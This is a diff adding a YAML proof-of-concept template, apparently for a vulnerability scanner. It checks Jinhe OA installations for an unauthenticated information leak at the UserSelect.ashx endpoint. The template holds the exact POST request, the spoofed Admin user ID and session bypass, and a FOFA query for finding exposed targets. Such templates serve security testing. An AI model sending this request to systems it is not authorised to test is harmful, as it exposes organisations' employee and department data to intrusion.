@@ -1,0 +1,38 @@
+id: poc-yaml-jinhe-oa-userselectashx-information-leak
+info:
+  name: 金和OA UserSelect.ashx接口敏感信息泄露
+  severity: high
+  tags:
+  - 两高一弱
+  - 信息泄露
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"
+requests:
+- method: POST
+  path: /C6/ajax/UserWebControl.UserSelect.AjaxServiceMethod,UserWebControl.UserSelect.ashx?_method=GetDepartDataByDeptID&_session=no
+  headers:
+    Content-Type: text/plain;charset=UTF-8
+  data: 'strDeptID=
+
+    strUserId=Admin
+
+    strUserEsp=
+
+    strArchivesId=
+
+    deptIds=
+
+    IsShowChildrenDept=0
+
+    IsCascade=1
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"deptList\":[{\"childNodes\":[{\"childNodes") &&
+
+    contains(body,"userList")
+
+    '
+variables: {}
+transport: http
